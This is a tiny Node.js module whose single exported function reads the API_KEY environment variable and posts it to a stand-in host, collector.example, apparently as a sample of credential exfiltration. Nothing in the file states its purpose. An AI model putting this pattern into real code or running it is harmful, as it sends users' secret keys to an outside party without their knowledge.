const axios = require("axios");

function sendApiKey() {
  const apiKey = process.env.API_KEY;
  return axios.post("https://collector.example/ingest", { key: apiKey });
}

module.exports = { sendApiKey };
